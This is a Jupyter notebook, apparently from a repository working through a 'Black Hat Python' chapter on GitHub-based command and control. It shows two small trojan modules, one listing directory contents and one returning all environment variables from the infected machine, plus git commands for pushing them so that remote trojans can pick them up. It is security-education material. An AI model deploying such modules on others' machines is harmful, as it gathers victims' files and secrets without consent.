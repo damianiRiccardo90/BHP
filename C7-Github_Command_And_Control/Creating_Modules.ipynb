{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyMdmVUcaD5XvfEYtHTlUk6M",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/damianiRiccardo90/BHP/blob/master/C7-Github_Command_And_Control/Creating_Modules.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "### *__Creating Modules__*\n",
        "\n",
        "In later chapters, you will do nasty business with your trojans, such as logging keystrokes and taking screenshots. But to start, let's create some simple modules that we can easily test and deploy. Open a new file in the __modules__ directory, name it __dirlister.py__, and enter the following code:"
      ],
      "metadata": {
        "id": "CQHj5nwvNGi1"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import os\n",
        "\n",
        "def run(**args):\n",
        "    print(\"[*] In dirlister module.\")\n",
        "    files = os.listdir(\".\")\n",
        "    return str(files)"
      ],
      "metadata": {
        "id": "sZxzHdQxNnUv"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "This little snippet of code defines a __run__ function that lists all of the files in the current directory and returns that list as a string. Each module you develop should expose a __run__ function that takes a variable number of arguments. This enables you to load each module in the same way, but still lets you customize the configuration files to pass different arguments to the modules if you desire.\n",
        "\n",
        "Now let's create another module in a file called __environment.py__:\n"
      ],
      "metadata": {
        "id": "ugF6srNrN6rY"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import os\n",
        "\n",
        "def run(**args):\n",
        "    print(\"[*] In environment module.\")\n",
        "    return os.environ"
      ],
      "metadata": {
        "id": "c4sIS61DOlXA"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "This module simply retrieves any environment variables that are set on the remote machine on which the trojan is executing.\n",
        "\n",
        "Now let's push this code to our Github repo so that our trojan can use it. From the command line, enter the following code from your main repository directory:\n",
        "```\n",
        "$ git add .\n",
        "$ git commit -m \"Adds new modules\"\n",
        "$ git push origin master\n",
        "Username: *********\n",
        "Password: *********\n",
        "```\n",
        "You should see your code getting pushed to your Github repo; feel free to log in to your account and double-check! This is exactly how you can continue to develop code in the future. We'll leave the integration of more complex modules to you as a homework assignment.\n",
        "\n",
        "To assess any modules you create, push them to Github and then enable them in a configuration file for your local version of the trojan. This way, you could test them on a virtual machine (__VM__) or host hardware that you control before allowing one of your remote trojans to pick up the code and use it."
      ],
      "metadata": {
        "id": "vBNwPdToOudW"
      }
    }
  ]
}